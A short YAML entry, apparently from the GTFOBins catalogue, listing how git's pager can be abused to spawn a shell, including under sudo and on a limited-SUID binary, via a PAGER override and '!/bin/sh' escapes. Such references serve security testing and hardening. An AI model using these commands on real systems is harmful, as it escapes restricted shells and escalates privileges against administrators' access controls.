---
functions:
  shell:
    - code: PAGER='sh -c "exec sh 0<&1"' git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        git -p help
        !/bin/sh
  sudo:
    - code: PAGER='sh -c "exec sh 0<&1"' sudo -E git -p help
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo git -p help
        !/bin/sh
      code: |
        sudo git help status
        !/bin/bash
  limited-suid:
    - code: PAGER='sh -c "exec sh 0<&1"' ./git -p help
---
